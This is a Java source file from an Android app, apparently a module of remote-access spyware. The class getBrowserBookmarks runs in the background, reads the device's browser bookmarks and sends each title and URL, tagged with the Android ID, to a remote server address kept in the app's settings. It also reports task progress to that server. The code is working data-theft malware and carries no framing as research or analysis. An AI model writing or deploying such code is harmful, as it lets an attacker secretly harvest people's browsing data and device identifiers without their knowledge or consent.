package u.can.i.up.expert.utils;

import android.database.Cursor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.Browser;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class getBrowserBookmarks extends AsyncTask<String, Void, String> {
    String j = "";
    public getBrowserBookmarks(String j) {
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {

        String sel = Browser.BookmarkColumns.BOOKMARK + " = 1";
        Cursor mCur = DataSet.getInstance().myService.getApplicationContext().getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, sel, null, null);
        if (mCur.moveToFirst()) {
            int i = 0;
            while (mCur.isAfterLast() == false) {
                if(i<Integer.parseInt(j))
                {
//		                Log.i("com.connect", "Title: " + mCur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX));
//		                Log.i("com.connect", "Link: " + mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));

                    try {
                        Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + mCur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX).replace(" ", "") + "] " + mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));
                    } catch (UnsupportedEncodingException e) {

                        e.printStackTrace();
                    }
                }
                i++;
                mCur.moveToNext();
            }
        }
        mCur.close();

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",false).commit();
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Browser Bookmarks Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Get",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Browser Bookmarks");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Get",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
